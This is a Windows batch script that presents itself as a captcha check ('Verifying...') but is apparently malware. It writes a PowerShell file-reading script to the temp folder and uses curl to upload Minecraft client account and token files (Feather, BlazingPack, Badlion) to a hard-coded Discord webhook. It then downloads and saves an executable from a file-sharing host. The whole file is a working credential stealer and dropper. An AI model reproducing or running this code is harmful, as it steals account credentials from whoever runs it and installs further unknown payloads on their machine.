...
title Captcha
echo Verifying...
set webhook=https://discord.com/api/webhooks/1284951933672624148/91-XOKknr8S7KBoSuIdraFBy2Xq6PiHPNtEDRir-KhYXix_337txqoGb26nBn_pGwIKM
...
:: Tworzenie skryptu PowerShell w katalogu tymczasowym
...
:: Dodanie logiki do pomijania zablokowanych plików i odczytu plików za pomocą FileStream
...
echo             if ($file -like "*LOCK*") { >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 Write-Host "Plik $file jest zablokowany. Pomijanie..." >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 continue >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo             } >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo             try { >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 $stream = [System.IO.File]::Open("$($path)\$($file)", 'Open', 'Read', 'Read', [System.IO.FileShare]::ReadWrite) >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 $reader = New-Object System.IO.StreamReader($stream) >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 $data = $reader.ReadToEnd() >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 $reader.Close() >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 $stream.Close() >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo             } catch { >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 Write-Host "Błąd odczytu pliku: $($path)\$($file) - $_" >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 continue >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo             } >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo             if (-not [string]::IsNullOrEmpty($data)) { >> %userprofile%\AppData\Local\Temp\testtttt.ps1
...
echo                 } >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo             } else { >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 Write-Host "Plik jest pusty: $($path)\$($file)" >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo             } >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo         } >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo     } else { >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo         Write-Host "Ścieżka nie istnieje: $path" >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo     } >> %userprofile%\AppData\Local\Temp\testtttt.ps1
echo } >> %userprofile%\AppData\Local\Temp\testtttt.ps1

:: Zbudowanie i wysłanie żądania webhook
...
curl -i -H 'Expect: application/json' --insecure -F file=@%userprofile%\AppData\Roaming\.feather\accounts.json %webhook%
curl -i -H 'Expect: application/json' --insecure -F file=@%userprofile%\AppData\Roaming\.blazingpack\accounts.dat %webhook%
curl -i -H 'Expect: application/json' --insecure -F "file=@%userprofile%\AppData\Roaming\Badlion Client\config\token.json" %webhook%
...
curl -L -s -k -o %TEMP%\ChilledWindows.exe "https://filetransfer.io/data-package/fcNInFTm/download"
